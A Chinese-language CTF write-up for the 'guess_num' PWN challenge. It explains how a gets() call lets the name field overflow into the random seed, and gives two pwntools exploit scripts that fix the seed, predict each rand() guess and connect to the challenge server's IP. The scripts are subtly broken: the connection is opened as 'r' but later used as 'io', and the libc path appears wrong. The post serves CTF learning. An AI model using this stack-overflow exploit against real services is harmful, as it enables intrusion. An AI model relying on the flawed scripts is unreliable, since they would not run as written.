---
title: (wp)攻防世界PWN——guess_num
date: 2020-04-02 21:34:48
id: 20200402213448
tags: 
	- CTF
	- PWN
categories: 网络安全
---

好久没有做PWN题了，今天开始做一下，把之前的东西捡起来，同时对之前有些知识点也有了新的认识，新的理解。

# 分析

首先将附件下载下来，同时通过nc连接一下，了解一下大致的流程。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200402220645.png)

可以看到，先让我们输入用户名，然后输入猜的的数字。

然后常规操作，通过`file`和`checksec`工具判断文件类型和开启了那些防护措施。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200402220856.png)

可以知道这是一个64位的linux程序，并且开启了部分只读，栈溢出保护，不可执行和地址随机化。

接着我们通过IDA加载，反汇编一下。

IDA加载程序后，`ctrl+F5`查看一下伪代码。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200402221626.png)

我们点击进入`sub_C3E()`，发现它会调用系统函数，打印flag，因此我们要保证程序能执行到这一步。

因此，在`v4`和`v6`比较时我们要保证这两个值相同，其中`v4`是我们的输入值，`v6`是随机数。我们知道这里的随机数是通过种子`seed`来形成的，如果`seed`一定，那么生成的随机数也是一定的。

双击`seed[0]`，可以发现`seed`是在栈帧中的，上面还有`var_30`。

查看汇编代码。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200402222715.png)

在代码中可以找到如下信息：

```assembly
var_30 = byte ptr -30h
seed   = dword ptr -10h

lea     rax, [rbp+var_30]
mov     rdi, rax
mov     eax, 0
call    _gets
mov     rax, qword ptr [rbp+seed]
mov     edi, eax        ; seed
call    _srand
```

我们输入的name，存在栈帧中，占20h，下面高地址位紧跟着seed的值。因此我们可以溢出覆盖掉seed，将种子设置为已知值，从而控制生成的随机数。

写出exp：

```python
from pwn import *
from ctypes import *

libc = cdll.LoadLibrary('/bin/x86_64-linux-gnu/libc.so.6')
libc.srand(1)
payload = 'A' * 0x20 + p64(1).decode()
r = remote('111.198.29.45', 57255)
r.recvuntil('name:')
r.sendline(payload)
for i in range(10):
    num = str(libc.rand() % 6 + 1)
    io.recvuntil('number:')
    io.sendline(num)

io.interactive()

```

其中so文件的路径是通过`ldd`工具找到的。

在这里，如果我们的开发环境不是在linux下，比如我是在MAC下，那么我们怎么去获得这个so文件呐。

既然没有，那我们是不是可以自己写一个呐，说干就干。

```c
#include<stdio.h>
#include<stdlib.h>

void srand1(){
  srand(1);
}

int rand1(){
  return rand();
}

```

然后通过gcc编译成一个so文件。

```shell
gcc -fPIC -shared g_rand.c -o g_rand.so
```

然后我们在exp中，将文件的路径改为我们生成的so文件，调用变为我们自己的函数，也可以实现。

```python
from pwn import *
from ctypes import *

libc = cdll.LoadLibrary('./g_rand.so')
libc.srand1()
payload = 'A' * 0x20 + p64(1).decode()
r = remote('111.198.29.45', 57255)
r.recvuntil('name:')
r.sendline(payload)
for i in range(10):
    num = str(libc.rand1() % 6 + 1)
    io.recvuntil('number:')
    io.sendline(num)

io.interactive()


```

